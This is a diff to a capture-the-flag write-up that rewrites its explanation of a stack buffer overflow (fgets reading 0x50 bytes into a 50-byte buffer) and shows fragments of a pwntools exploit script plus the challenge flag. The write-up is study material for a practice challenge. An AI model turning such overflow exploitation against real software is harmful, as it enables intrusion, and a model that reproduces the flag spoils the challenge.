@@ -7,11 +7,7 @@ nc chall.pwnoh.io 13372
 ```
 
 # Solution
-Use IDA64 to decompile binaryfile, easyly that fgets read 80 byte of "favoriteNumber" but favoriteNumber[8] have only 8 byte 
-
-![image](https://github.com/N1GHT-F4LL/CTF/assets/60804710/13b3cb16-cef1-475b-972c-913d656961eb)
-
-
+ char buf[50] has 50 byte but fgets(buf, 0x50, stdin) can  read 80 byte, so that is buffer overflow. We just need to calculate or try, a suitable offset number to get the flag.
 ```
 from pwn import *
 
@@ -27,4 +23,4 @@ p.sendline(payload)
 p.interactive()
 ```
 
-#bctf{wHy_WriTe_OveR_mY_V@lUeS}
+> bctf{wHy_WriTe_OveR_mY_V@lUeS}
